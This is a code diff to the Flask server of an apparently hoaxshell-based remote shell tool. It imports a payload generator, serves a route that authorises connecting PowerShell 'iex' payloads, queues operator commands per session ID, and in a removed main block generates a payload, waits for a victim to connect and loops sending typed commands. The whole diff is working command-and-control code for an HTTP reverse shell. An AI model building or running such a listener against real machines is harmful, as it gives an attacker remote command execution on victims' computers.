@@ -1,8 +1,7 @@
 from flask import Flask, request
-import logging
+import core.server as sSrv
 import threading
 import time
-import random, string
 import core.hoaxshell.payloads as payloads
 
 hxshl = Flask(__name__)
@@ -14,7 +13,7 @@ class shellData:
     responses = {}
 
 class interactive:
-    def run(cmd, uid, timeout=5, _async=False):
+    def run(cmd, uid, timeout=30, _async=False):
         cycles = 0
         shellData.cmds[uid] = [cmd]
 
@@ -44,9 +43,6 @@ class interactive:
             time.sleep(0.1)
             pass
         shellData.responses[uid].pop(0)
-    
-def createUID():
-    return ''.join([random.choice(string.ascii_uppercase) for x in range(24)])
 
 # UIDs are always in this format:
 
@@ -61,7 +57,7 @@ def createUID():
 ## initial authorization
 @hxshl.route("/e030d4f6")
 def IEX_init():
-    payloadID = createUID()
+    payloadID = sSrv.shellServer.genUID(24)
 
     print("authorization of ", end="")
     print(request.headers.get("Authorization"))
@@ -135,34 +131,3 @@ def startServer(ip:str, port=12728):
     #log.setLevel(logging.ERROR)
 
     hxshl.run(ip, port=port)
-
-if __name__ == "__main__":
-
-    a = threading.Thread(target=startServer, daemon=True)
-    a.start()
-
-    payload = payloads.genPayload("iex", "127.0.0.1", 12728, response="2f810c1e")
-    shellData.allowedUIDS.append(payload["payloadId"])
-
-    print("! payload: !")
-    print("-" * 25)
-    print(payload["original"])
-    print("-" * 25)
-    print("id: {}".format(payload["payloadId"]))
-    print("-" * 25)
-
-
-    # wait for the connection
-    print("waiting for connection")
-
-    while len(shellData.hxUIDS) == 0:
-        time.sleep(0.1)
-
-    # set uid
-    hxUid = list(shellData.cmds)[0]
-
-    interactive.run(hxUid, "$UID = \""+createUID()+"\"")
-
-    # actual communication
-    while True:
-        print(interactive.run(hxUid, input(">")))
